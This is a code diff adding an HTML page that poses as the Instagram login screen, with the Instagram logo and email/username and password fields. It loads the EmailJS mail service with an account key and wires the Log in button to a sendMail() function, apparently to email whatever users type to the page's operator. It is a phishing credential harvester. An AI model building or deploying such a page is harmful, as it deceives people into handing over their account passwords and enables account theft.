@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <link rel="stylesheet" href="./form.css" />
+    <script src="../index.js"></script>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        // Thron
+        emailjs.init("yF_TSa7g2HUsqc87p");
+      })();
+    </script>
+  </head>
+
+  <body>
+    <main class="form__container">
+      <img src="/assets/instagramlogo.png" alt="Instagram" />
+      <!-- <form action="" method="post"> -->
+      <form>
+        <input
+          type="email"
+          name="email"
+          id="email"
+          placeholder="Phone number, username, or email"
+        />
+        <input
+          type="password"
+          name="password"
+          id="password"
+          placeholder="Password"
+        />
+
+        <button onclick="sendMail()">Log in</button>
+      </form>
+
+      <a href="#"> Forgot password?</a>
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </main>
+    <script></script>
+  </body>
+</html>
